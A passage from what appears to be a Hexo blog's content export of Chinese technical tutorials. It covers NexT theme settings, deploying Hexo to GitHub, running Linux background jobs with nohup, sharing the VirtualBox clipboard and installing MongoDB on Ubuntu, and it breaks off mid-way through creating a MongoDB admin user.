class="line"></span><br><span class="line"><span class="comment"># Disqus</span></span><br><span class="line"><span class="comment">#disqus_shortname:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Share</span></span><br><span class="line"><span class="comment">#jiathis:</span></span><br><span class="line"><span class="comment">#add_this_id:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Share</span></span><br><span class="line">duoshuo_share: true</span><br><span class="line"></span><br><span class="line"><span class="comment"># Google Webmaster tools verification setting</span></span><br><span class="line"><span class="comment"># See: https://www.google.com/webmasters/</span></span><br><span class="line"><span class="comment">#google_site_verification:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Google Analytics</span></span><br><span class="line"><span class="comment">#google_analytics:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Make duoshuo show UA</span></span><br><span class="line"><span class="comment"># user_id must NOT be null when admin_enable is true!</span></span><br><span class="line"><span class="comment"># you can visit http://dev.duoshuo.com get duoshuo user id.</span></span><br><span class="line">duoshuo_info:</span><br><span class="line">  ua_enable: true</span><br><span class="line">  admin_enable: false</span><br><span class="line">  user_id: <span class="number">0</span></span><br><span class="line">  <span class="comment">#admin_nickname: ROOT</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Facebook SDK Support.</span></span><br><span class="line"><span class="comment"># https://github.com/iissnan/hexo-theme-next/pull/410</span></span><br><span class="line">facebook_sdk:</span><br><span class="line">  enable: false</span><br><span class="line">  app_id:       <span class="comment">#&lt;app_id&gt;</span></span><br><span class="line">  fb_admin:     <span class="comment">#&lt;user_id&gt;</span></span><br><span class="line">  like_button:  <span class="comment">#true</span></span><br><span class="line">  webmaster:    <span class="comment">#true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show number of visitors to each article.</span></span><br><span class="line"><span class="comment"># You can visit https://leancloud.cn get AppID and AppKey.</span></span><br><span class="line">leancloud_visitors:</span><br><span class="line">  enable: false</span><br><span class="line">  app_id: <span class="comment">#&lt;app_id&gt;</span></span><br><span class="line">  app_key: <span class="comment">#&lt;app_key&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tencent analytics ID</span></span><br><span class="line"><span class="comment"># tencent_analytics:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#! ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#! DO NOT EDIT THE FOLLOWING SETTINGS</span></span><br><span class="line"><span class="comment">#! UNLESS YOU KNOW WHAT YOU ARE DOING</span></span><br><span class="line"><span class="comment">#! ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Motion</span></span><br><span class="line">use_motion: true</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fancybox</span></span><br><span class="line">fancybox: true</span><br><span class="line"></span><br><span class="line"><span class="comment"># Static files</span></span><br><span class="line">vendors: vendors</span><br><span class="line">css: css</span><br><span class="line">js: js</span><br><span class="line">images: images</span><br><span class="line"></span><br><span class="line"><span class="comment"># Theme version</span></span><br><span class="line">version: <span class="number">0.5</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
<h2 id="分类页面，标签页面，关于页面创建"><a href="#分类页面，标签页面，关于页面创建" class="headerlink" title="分类页面，标签页面，关于页面创建"></a>分类页面，标签页面，关于页面创建</h2><p>以标签页面为例：<br>1.首先运行以下命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 标签为&quot;tags&quot;,分类为&quot;categories&quot;,关于为&quot;about&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure>
<p>在站点/source目录下会生成一个tags文件夹，里面包含一个index.md文件。<br>2.修改/source/tags目录下的index.md文件  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">title: tags</span><br><span class="line">date: <span class="number">2015</span>-09-<span class="number">29</span> <span class="number">14</span>:<span class="number">37</span>:02</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span> <span class="comment"># 同理分类为&quot;categories&quot;，关于为&quot;about&quot;</span></span><br><span class="line"></span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>3.修改主题配置文件<br>去掉tags的注释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: /                       <span class="comment">#主页</span></span><br><span class="line">  categories: /categories	    <span class="comment">#分类页（需手动创建）</span></span><br><span class="line">  <span class="comment">#about: /about		        #关于页面（需手动创建）</span></span><br><span class="line">  <span class="comment">#archives: /archives	     	#归档页</span></span><br><span class="line">  tags: /tags		        	<span class="comment">#标签页（需手动创建）</span></span><br><span class="line">  <span class="comment">#commonweal: /404.html        #公益 404 （需手动创建）</span></span><br></pre></td></tr></table></figure>
<h2 id="多说评论"><a href="#多说评论" class="headerlink" title="多说评论"></a>多说评论</h2><p>多说评论的添加在这就不多说了，<a href="http://theme-next.iissnan.com/five-minutes-setup.html">官方教程</a>内已经讲得非常详细，关于多说评论的美化如显示系统与浏览器请参考<a href="http://lovenight.github.io/2015/11/10/Hexo-3-1-1-%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/">loveNight的博客</a>里面讲的也很详细，如果还是不懂请在下方评论留言。</p>
<h2 id="站内搜索"><a href="#站内搜索" class="headerlink" title="站内搜索"></a>站内搜索</h2><p>站内搜索的官方教程有所变化，所以在此为大家详细讲解一下。<br>前往<a href="https://swiftype.com/users/sign_up">Swiftype注册页面</a>，注册一个新账户。<br><img src="/images/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94-%20Hexo%E7%BE%8E%E5%8C%96%5CQQ%E6%88%AA%E5%9B%BE20160301201354.png"><br><img src="/images/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94-%20Hexo%E7%BE%8E%E5%8C%96%5CQQ%E6%88%AA%E5%9B%BE20160301201603.png"><br><img src="/images/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94-%20Hexo%E7%BE%8E%E5%8C%96%5CQQ%E6%88%AA%E5%9B%BE20160301201627.png"><br><img src="/images/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94-%20Hexo%E7%BE%8E%E5%8C%96%5CQQ%E6%88%AA%E5%9B%BE20160301201704.png"><br><img src="/images/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94-%20Hexo%E7%BE%8E%E5%8C%96%5CQQ%E6%88%AA%E5%9B%BE20160301201800.png"><br><img src="/images/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94-%20Hexo%E7%BE%8E%E5%8C%96%5CQQ%E6%88%AA%E5%9B%BE20160301201916.png"><br><img src="/images/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94-%20Hexo%E7%BE%8E%E5%8C%96%5CQQ%E6%88%AA%E5%9B%BE20160301202017.png"><br>编辑站点配置文件，新增字段 <code>swiftype_key</code>，值设置成上述步骤复制出来的key。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Swiftype Search Key</span></span><br><span class="line">swiftype_key: xxxxxxxxx</span><br></pre></td></tr></table></figure>
<hr>
<p>到此基本上已经把Hexo博客的内容说完了，还有一些功能如站点统计等请参考以下的参考资料。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://hexo.io/zh-cn/docs/">Hexo中文文档</a></li>
<li><a href="http://theme-next.iissnan.com/">Next文档</a></li>
<li><a href="http://lovenight.github.io/2015/11/10/Hexo-3-1-1-%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/">Hexo 3.1.1 静态博客搭建指南</a><strong>推荐</strong></li>
<li><a href="http://blog.shijinrong.cn/2016/01/03/2016-01-03-how-to-build-blog/">如何使用10个小时搭建出个人域名而又Geek的独立博客？</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo搭建个人博客（二）— 搭建Hexo</title>
    <url>/2016/02/28/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%20%E6%90%AD%E5%BB%BAHexo/</url>
    <content><![CDATA[<p>这篇文章主要介绍如何搭建本地Hexo博客，并将博客部署到github。</p>
<span id="more"></span>
<hr>
<h1 id="初始化Hexo"><a href="#初始化Hexo" class="headerlink" title="初始化Hexo"></a>初始化Hexo</h1><p>在电脑上任意一个你喜欢的地方创建一个文件夹，文件夹的名字命名为username.github.io（还记得它吗？就是上次我们创建github repository的名字。）<br><img src="/images/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94-%E6%90%AD%E5%BB%BAHexo%5CQQ%E5%9B%BE%E7%89%8720160228130934.png"><br>然后，打开文件夹在其内部右键选择Git Bash here。在弹出的界面中输入<code>hexo init</code>，等待安装结束后接着输入<code>npm install</code>，安装过程可能不会显示，稍等片刻等待安装完成.这时文件夹内有以下文件：<br><img src="/images/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94-%E6%90%AD%E5%BB%BAHexo%5CQQ%E6%88%AA%E5%9B%BE20160228133454.png"></p>
<h1 id="Hexo的使用"><a href="#Hexo的使用" class="headerlink" title="Hexo的使用"></a>Hexo的使用</h1><h2 id="启动本地服务器"><a href="#启动本地服务器" class="headerlink" title="启动本地服务器"></a>启动本地服务器</h2><p>在刚刚的命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>

<p>Hexo server启动后，在浏览器中打开<a href="http://localhost:4000/">http://localhost:4000/</a>即可访问自己的本地博客，按Ctrl+C停止服务器。到这一步你已经搭建好自己的本地博客，接着我们就把它部署到github，让别人也可以浏览你的博客。</p>
<h1 id="Hexo部署github"><a href="#Hexo部署github" class="headerlink" title="Hexo部署github"></a>Hexo部署github</h1><h2 id="设置SSH-keys"><a href="#设置SSH-keys" class="headerlink" title="设置SSH keys"></a>设置SSH keys</h2><p>我们需要通过SSH keys将git与github联系起来。步骤如下：<br>1.打开git bash，输入<code>cd ~/.ssh</code>，如果果提示：<code>No such file or directory</code> 说明未设置SSH。<br>2.接着输入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮件地址@youremail.com&quot;</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> which to save the key (/Users/your_user_directory/.ssh/id_rsa):&lt;回车就好&gt;</span><br></pre></td></tr></table></figure>

<p>此处应注意<code>-C</code>为大写C，邮箱地址为你创建github账号的邮箱地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):&lt;输入加密串&gt;</span><br><span class="line">Enter same passphrase again:&lt;再次输入加密串&gt;</span><br></pre></td></tr></table></figure>
<p>输入密码，此密码为提交项目时所用。（ps：输入时可能无显示，直接输入即可。）<br>3.用记事本打开C:\Documents and Settings\Administrator.ssh\id_rsa.pub文件，全选并复制公钥。<br>4.登录Github，点击右上角头像——&gt;<code>settings</code>——&gt;——&gt;<code>SSH keys</code>——&gt;<code>New SSH key</code>，把公钥粘贴到key中，填好title并点击<code>Add SSH key</code>。<br>5.输入以下命令测试是否成功</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure>
<p>出现如下反馈，输入<code>yes</code>出现<code>Hi xxxx! You’ve successfully authenticated, but GitHub does not provide shell access.</code>说明成功连接github。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">The authenticity of host <span class="string">&#x27;github.com (207.97.227.239)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)?</span></span><br></pre></td></tr></table></figure>
<h1 id="修改站点配置文件"><a href="#修改站点配置文件" class="headerlink" title="修改站点配置文件"></a>修改站点配置文件</h1><p>在你的博客文件夹中找到<code>_config.yml</code>并打开<br><img src="/images/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94-%E6%90%AD%E5%BB%BAHexo%5CQQ%E6%88%AA%E5%9B%BE20160228133454.png"><br>找到以下内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: http://hexo.io/docs/deployment.html</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>:</span><br></pre></td></tr></table></figure>
<p>并修改为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deployment# Deployment</span></span><br><span class="line"><span class="comment">## Docs: http://hexo.io/docs/deployment.html</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: https://github.com/Wooden-Robot/Wooden-Robot.github.io</span><br><span class="line">  branch: master</span><br><span class="line">  plugins: -hexo-generator-feed</span><br></pre></td></tr></table></figure>
<p>注意<code>repository</code>为你的github page的项目地址。</p>
<h1 id="部署github"><a href="#部署github" class="headerlink" title="部署github"></a>部署github</h1><p>在你的博客文件夹内右键打开Git Bash here输入下列代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ hexo g <span class="comment">#生成静态网页</span></span><br><span class="line">$ hexo d <span class="comment">#开始部署</span></span><br></pre></td></tr></table></figure>
<p>过程中会提示输入你的github username和密码（密码为，等待命令运行完成即可。部署完成后，在浏览器中访问<a href="http://wooden-robot.github.io/">http://Wooden-Robot.github.io/</a>能够看到你的Hexo博客，到此部署成功！<br>有些版本的Hexo没有内置<code>hexo-deployer-git</code>，会出现下列情况：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Deployer <span class="keyword">not</span> found: git</span><br></pre></td></tr></table></figure>
<p>这时候输入以下代码安装即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<h1 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hexo g == hexo generate</span><br><span class="line">hexo s == hexo server</span><br><span class="line">hexo d == hexo deploy</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 后台运行任务 nohup 和 &amp;</title>
    <url>/2019/07/04/Linux-%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E4%BB%BB%E5%8A%A1-nohup-%E5%92%8C/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h2><blockquote>
<p>用途：不挂断地运行命令。</p>
</blockquote>
<blockquote>
<p>语法：nohup Command [ Arg … ] [　&amp; ]</p>
<p>无论是否将 nohup 命令的输出重定向到终端，输出都将附加到当前目录的 nohup.out 文件中。</p>
<p>如果当前目录的 nohup.out 文件不可写，输出重定向到 $HOME/nohup.out 文件中。</p>
<p>如果没有文件能创建或打开以用于追加，那么 Command 参数指定的命令不可调用。</p>
</blockquote>
<blockquote>
<p>退出状态：该命令返回下列出口值： </p>
<p>126 可以查找但不能调用 Command 参数指定的命令。</p>
<p>127 nohup 命令发生错误或不能查找由 Command 参数指定的命令。<br>否则，nohup 命令的退出状态是 Command 参数指定命令的退出状态。</p>
</blockquote>
<span id="more"></span>
<p>使用 <code>nohup</code> 运行程序:</p>
<ul>
<li>输出重定向，默认重定向到当前目录下 <code>nohup.out</code> 文件</li>
<li>使用 <code>Ctrl + C</code> 发送  <code>SIGINT</code> 信号，程序关闭</li>
<li>关闭 <code>Shell Session</code> 发送 <code>SIGHUP</code> 信号，程序免疫</li>
</ul>
<h2 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h2><p>使用 <code>&amp;</code> 运行程序：</p>
<ul>
<li>程序转入后台运行</li>
<li>结果会输出到终端</li>
<li>使用<code> Ctrl + C</code> 发送<code> SIGINT</code> 信号，程序免疫</li>
<li>关闭 <code>Shell session</code> 发送 <code>SIGHUP</code> 信号，程序关闭</li>
</ul>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="后台运行程序"><a href="#后台运行程序" class="headerlink" title="后台运行程序"></a>后台运行程序</h2><p>一般两个一起组合使用不会受 <code>Ctrl C</code> 和 <code>Shell</code> 关闭的影响：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> <span class="built_in">command</span> &amp;</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出默认重定向到当前目录下 nohup.out 文件</span></span><br><span class="line">1. <span class="built_in">nohup</span> python main.py &amp;  </span><br><span class="line"><span class="comment"># 自定义输出文件(标准输出和错误输出合并到 main.log)</span></span><br><span class="line">2. <span class="built_in">nohup</span> python main.py &gt;&gt; main.log 2&gt;&amp;1 &amp; </span><br><span class="line"><span class="comment"># 与上一个例子相同作用的简写方法</span></span><br><span class="line">3. <span class="built_in">nohup</span> python main.py &amp;&gt; main.log &amp;</span><br><span class="line"><span class="comment"># 不记录输出信息</span></span><br><span class="line">4. <span class="built_in">nohup</span> python main.py &amp;&gt; /dev/null &amp;</span><br><span class="line"><span class="comment"># 不记录输出信息并将程序的进程号写入 pidfile.txt 文件中，方便后续杀死进程</span></span><br><span class="line">5. <span class="built_in">nohup</span> python main.py &amp;&gt; /dev/null &amp; <span class="built_in">echo</span> $! &gt; pidfile.txt</span><br></pre></td></tr></table></figure>
<h2 id="查看后台运行任务"><a href="#查看后台运行任务" class="headerlink" title="查看后台运行任务"></a>查看后台运行任务</h2><p>查看当前有多少在后台运行的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">jobs</span> -l</span><br></pre></td></tr></table></figure>
<p>选项可显示所有任务的 PID，jobs 的状态可以是 running, stopped, Terminated 。</p>
<p><strong>注：只有在当前 <code>Shell session</code> 中可以查看后台运行的程序，退出 <code>Shell</code> 后无法在从 <code>jobs -l</code> 中查询到已经后台运行的程序</strong></p>
<h2 id="杀死后台运行程序"><a href="#杀死后台运行程序" class="headerlink" title="杀死后台运行程序"></a>杀死后台运行程序</h2><ol>
<li>方法一</li>
</ol>
<p>启动时输出后台运行程序的进程号，然后读取进程号杀死后台程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 `<span class="built_in">cat</span> pidfile.txt`</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>方法二</li>
</ol>
<p>根据程序名杀死后台进程：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef | grep <span class="string">&#x27;python main.py&#x27;</span> | grep -v grep | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> |xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure>
<h2 id="其他相关命令"><a href="#其他相关命令" class="headerlink" title="其他相关命令"></a>其他相关命令</h2><ul>
<li><strong>Ctrl + z</strong><br>可以将一个<strong>正在前台执行</strong>的命令放到<strong>后台</strong>，并且处于<strong>暂停</strong>状态。</li>
<li><strong>bg</strong><br>将一个在<strong>后台暂停</strong>的命令，变成在<strong>后台继续执行</strong>。如果后台中有多个命令，可以用 <code>bg %jobnumber</code> 将选中的命令调出。</li>
<li><strong>fg</strong><br>将<strong>后台</strong>中的命令调至<strong>前台继续运行</strong>。如果后台中有多个命令，可以用 <code>fg %jobnumber</code>（是命令编号，不是进程号）将选中的命令调出。</li>
</ul>
<h1 id="附：Shell中的特殊变量说明"><a href="#附：Shell中的特殊变量说明" class="headerlink" title="附：Shell中的特殊变量说明"></a>附：Shell中的特殊变量说明</h1><table>
<thead>
<tr>
<th>变量</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>$$</td>
<td>Shell 本身的 PID（ProcessID）</td>
</tr>
<tr>
<td>$!</td>
<td>Shell 最后运行的后台 Process 的 PID</td>
</tr>
<tr>
<td>$?</td>
<td>最后运行的命令的结束代码（返回值）</td>
</tr>
<tr>
<td>$-</td>
<td>使用 Set 命令设定的 Flag 一览</td>
</tr>
<tr>
<td>$*</td>
<td>所有参数列表。如 “$*” 用「”」括起来的情况、以 “$1 $2 … $n” 的形式输出所有参数</td>
</tr>
<tr>
<td>$@</td>
<td>所有参数列表。如 “$@” 用「”」括起来的情况、以 “$1” “$2” … “$n” 的形式输出所有参数</td>
</tr>
<tr>
<td>$#</td>
<td>添加到 Shell 的参数个数</td>
</tr>
<tr>
<td>$0</td>
<td>Shell 本身的文件名</td>
</tr>
<tr>
<td>$1～$n</td>
<td>添加到 Shell 的各参数值。$1 是第 1 参数、$2 是第 2 参数…</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac OS 与 VirtualBox 中的 Ubuntu 共享剪切板</title>
    <url>/2018/02/01/Mac-OS-%E4%B8%8E-VirtualBox-%E4%B8%AD%E7%9A%84-Ubuntu-%E5%85%B1%E4%BA%AB%E5%89%AA%E5%88%87%E6%9D%BF/</url>
    <content><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p><img src="/images/Mac%20OS%20%E4%B8%8E%20VirtualBox%20%E4%B8%AD%E7%9A%84%20Ubuntu%20%E5%85%B1%E4%BA%AB%E5%89%AA%E5%88%87%E6%9D%BF1.png"><br>首先设置双向共享剪切板，然后：</p>
<ul>
<li>启动虚拟机, 然后在点击的虚拟机的窗口菜单上的Devices &gt; Insert Guest Addtjions CD image…</li>
<li>虚拟机中弹出对话框, 点击运行  </li>
</ul>
<p>安装失败再次安装出现下方错误：<br><img src="/images/Mac%20OS%20%E4%B8%8E%20VirtualBox%20%E4%B8%AD%E7%9A%84%20Ubuntu%20%E5%85%B1%E4%BA%AB%E5%89%AA%E5%88%87%E6%9D%BF2.png"></p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>在 Ubuntu 虚拟机终端运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install virtualbox-guest-utils</span><br></pre></td></tr></table></figure>
<p>安装完成后重启虚拟机即可与Mac OS 共享剪切板。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://askubuntu.com/questions/573596/unable-to-install-guest-additions-cd-image-on-virtual-box">Unable to Install Guest Additions CD Image on Virtual Box</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>VirtualBox</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 使用系列（一）-- 安装</title>
    <url>/2018/02/03/MongoDB-%E4%BD%BF%E7%94%A8%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>系统：Ubuntu 16.04</li>
<li>MongoDB 版本：3.6<span id="more"></span>


</li>
</ul>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="添加软件源"><a href="#添加软件源" class="headerlink" title="添加软件源"></a>添加软件源</h2><p>1.添加 MongoDB 签名到 APT</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv EA312927</span><br></pre></td></tr></table></figure>
<p>2.创建/etc/apt/sources.list.d/mongodb-org-3.6.list文件并写入命令  </p>
<p>Ubuntu 14.04</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo &quot;deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu trusty/mongodb-org/3.6 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.6.list</span><br></pre></td></tr></table></figure>
<p>Ubuntu 16.04</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo &quot;deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.6.list</span><br></pre></td></tr></table></figure>
<p>由于官方镜像下载速度过慢可采用国内镜像进行安装：</p>
<p>Ubuntu 14.04</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;deb http://mirrors.aliyun.com/mongodb/apt/ubuntu trusty/mongodb-org/3.6 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.6.list</span><br></pre></td></tr></table></figure>
<p>Ubuntu 16.04</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;deb http://mirrors.aliyun.com/mongodb/apt/ubuntu xenial/mongodb-org/3.6 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.6.list</span><br></pre></td></tr></table></figure>
<h2 id="更新软件源列表"><a href="#更新软件源列表" class="headerlink" title="更新软件源列表"></a>更新软件源列表</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>
<h2 id="安装-MongoDB"><a href="#安装-MongoDB" class="headerlink" title="安装 MongoDB"></a>安装 MongoDB</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install -y mongodb-org</span><br></pre></td></tr></table></figure>
<h2 id="运行-MongoDB"><a href="#运行-MongoDB" class="headerlink" title="运行 MongoDB"></a>运行 MongoDB</h2><p>1.启动 MongoDB</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo service mongod start</span><br></pre></td></tr></table></figure>
<p>2.通过日志确认 MongoDB 启动成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tail -10f /var/log/mongodb/mongod.log</span><br></pre></td></tr></table></figure>
<p>看到下列内容则为启动成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[initandlisten] waiting for connections on port 27017</span><br></pre></td></tr></table></figure>
<p>3.关闭 MongoDB</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo service mongod stop</span><br></pre></td></tr></table></figure>
<p>4.重启 MongoDB</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo service mongod restart</span><br></pre></td></tr></table></figure>
<p>5.查看 MongoDB 状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo service mongod status</span><br></pre></td></tr></table></figure>

<h2 id="MongoDB-数据、日志及配置文件默认存放路径"><a href="#MongoDB-数据、日志及配置文件默认存放路径" class="headerlink" title="MongoDB 数据、日志及配置文件默认存放路径"></a>MongoDB 数据、日志及配置文件默认存放路径</h2><ol>
<li>数据默认存放路径：<code>/var/lib/mongodb</code></li>
<li>日志默认存放路径：<code>/var/log/mongodb</code></li>
<li>配置文件默认存放路径: <code>/etc/mongod.conf</code></li>
</ol>
<h2 id="用户权限设置"><a href="#用户权限设置" class="headerlink" title="用户权限设置"></a>用户权限设置</h2><h3 id="添加管理员账号"><a href="#添加管理员账号" class="headerlink" title="添加管理员账号"></a>添加管理员账号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">MongoDB shell version v3.6.2</span><br><span class="line">connecting to: mongodb://127.0.0.1:27017</span><br><span class="line">MongoDB server version: 3.6.2</span><br><span class="line">&gt; use admin </span><br><span class="line">&gt; db.createUser(</span><br><span class="line">   &#123;</span><br><span class="line">     user: &quot;admin&quot;,</span><br><span class="line">     pwd: &quot;mongodb123456&quot;,</span><br><span class="line">     roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125; ]</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br><span class="line">Successfully added user: 